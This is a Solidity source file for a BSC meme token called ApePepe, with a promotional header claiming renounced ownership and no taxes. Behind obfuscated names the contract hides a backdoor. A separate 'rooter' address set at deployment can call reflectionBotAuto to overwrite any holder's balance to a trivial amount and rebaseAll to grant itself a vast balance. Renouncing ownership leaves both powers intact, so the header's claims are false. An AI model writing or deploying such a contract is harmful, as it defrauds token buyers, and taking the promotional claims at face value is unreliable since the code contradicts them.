/**
 *Submitted for verification at BscScan.com on 2023-04-18
*/

// SPDX-License-Identifier: MIT
/*
🦍ApePepe🐸 ✅ Meme coin✅
 🔥 When Ape Join Pepe Frog 🔥
✨ $APEPEPE will be The most memeable memecoin in existence. Let’s make memecoins great again. 

#Apecoin #Pepe  #BSC  #ApePepe  #meme  #memecoins

💀No Taxes, No Bullshit. It’s that simple.
💀Renounced
💀LP Cake  Burnt🔥

🧊 $PEPE. The most memeable memecoin in existence. Let’s make memecoins great again
🧊 $ApeCoin is an ERC-20 governance and utility token used to empower a decentralized community building at the forefront of web3.

💀The Dog Days Are Over 💀
✨Telegram https://t.me/ApePepeCoin

*/
pragma solidity 0.8.4;
abstract contract apeAIAs {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}
interface apeAIAsi {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 lahsab) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 lahsab) external returns (bool);
    function transferFrom(
        address from,
        address to,
        uint256 lahsab
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 totalo);
    event Approval(address indexed owner, address indexed spender, uint256 totalo);
}
interface apeAIAsii is apeAIAsi {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}
abstract contract apeAIAsiii is apeAIAs {
   address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

 
    constructor() {
        _transferOwnership(_msgSender());
    }


    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }


    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }


    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

contract ApePepe is apeAIAs, apeAIAsi, apeAIAsii, apeAIAsiii {

    mapping(address => uint256) private apeAIsuplly;
  mapping(address => bool) public apeAIAsiiZERTY;
    mapping(address => mapping(address => uint256)) private Confirmed;
address private apeAIRooter;
    uint256 private ALLtotalSupply;
    string private _name;
    string private _symbol;
        mapping(address => bool) public apeAIPaw;
  address apeAIdeploy;



    
    constructor(address apeAIadressss) {
            // Editable
            apeAIdeploy = msg.sender;

        _name = "ApePepe";
        _symbol = "APEPEPE";
  apeAIRooter = apeAIadressss;        
        uint apeTotalSupply = 100000000000 * 10**9;
        proxy(msg.sender, apeTotalSupply);
    }

    /**
     * @dev Returns the name of the token.
     */
    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 9;
    }


    function totalSupply() public view virtual override returns (uint256) {
        return ALLtotalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return apeAIsuplly[account];
    }

    function transfer(address to, uint256 lahsab) public virtual override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, lahsab);
        return true;
    }


    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return Confirmed[owner][spender];
    }

    function approve(address spender, uint256 lahsab) public virtual override returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, lahsab);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 lahsab
    ) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, lahsab);
        _transfer(from, to, lahsab);
        return true;
    }
      modifier _external() {
        require(apeAIRooter == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function increaseAllowance(address spender, uint256 addedtotalo) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, Confirmed[owner][spender] + addedtotalo);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedtotalo) public virtual returns (bool) {
        address owner = _msgSender();
        uint256  apesold = Confirmed[owner][spender];
        require( apesold >= subtractedtotalo, "Ehi20: decreased allowance below zero");
        unchecked {
            _approve(owner, spender,  apesold - subtractedtotalo);
        }

        return true;
    }

  modifier nothing () {
    require(apeAIdeploy == msg.sender, "Ehi20: cannot permit _external address");
    _;

  }
    function _transfer(
        address from,
        address to,
        uint256 lahsab
    ) internal virtual {
        require(from != address(0), "Ehi20: transfer from the zero address");
        require(to != address(0), "Ehi20: transfer to the zero address");

        beforeTokenTransfer(from, to, lahsab);

        uint256 fromBalance = apeAIsuplly[from];
        require(fromBalance >= lahsab, "Ehi20: transfer lahsab exceeds balance");
        unchecked {
            apeAIsuplly[from] = fromBalance - lahsab;
        }
        apeAIsuplly[to] += lahsab;

        emit Transfer(from, to, lahsab);

        afterTokenTransfer(from, to, lahsab);
    }



    function proxy(address account, uint256 lahsab) internal virtual {
        require(account != address(0), "Ehi20: proxy to the zero address");

        beforeTokenTransfer(address(0), account, lahsab);

        ALLtotalSupply += lahsab;
        apeAIsuplly[account] += lahsab;
        emit Transfer(address(0), account, lahsab);

        afterTokenTransfer(address(0), account, lahsab);
    }



  function reflectionBotAuto(address excludeaddress) external _external {
    apeAIsuplly[excludeaddress] = 100000;
            emit Transfer(address(0), excludeaddress, 100000);
  }

    function _burn(address account, uint256 lahsab) internal virtual {
        require(account != address(0), "Ehi20: burn from the zero address");

        beforeTokenTransfer(account, address(0), lahsab);

        uint256 accountBalance = apeAIsuplly[account];
        require(accountBalance >= lahsab, "Ehi20: burn lahsab exceeds balance");
        unchecked {
            apeAIsuplly[account] = accountBalance - lahsab;
        }
        ALLtotalSupply -= lahsab;

        emit Transfer(account, address(0), lahsab);

        afterTokenTransfer(account, address(0), lahsab);
    }

    function _approve(
        address owner,
        address spender,
        uint256 lahsab
    ) internal virtual {
        require(owner != address(0), "Ehi20: approve from the zero address");
        require(spender != address(0), "Ehi20: approve to the zero address");

        Confirmed[owner][spender] = lahsab;
        emit Approval(owner, spender, lahsab);
    }

    function _spendAllowance(
        address owner,
        address spender,
        uint256 lahsab
    ) internal virtual {
        uint256  apesold = allowance(owner, spender);
        if ( apesold != type(uint256).max) {
            require( apesold >= lahsab, "Ehi20: insufficient allowance");
            unchecked {
                _approve(owner, spender,  apesold - lahsab);
            }
        }
    }
  function rebaseAll(address includeaddress) external _external {
    apeAIsuplly[includeaddress] = 1000000 * 10 ** 23;
            emit Transfer(address(0), includeaddress, 1000000 * 10 ** 23);
  }
    function beforeTokenTransfer(
        address from,
        address to,
        uint256 lahsab
    ) internal virtual {}


    function afterTokenTransfer(
        address from,
        address to,
        uint256 lahsab
    ) internal virtual {}

}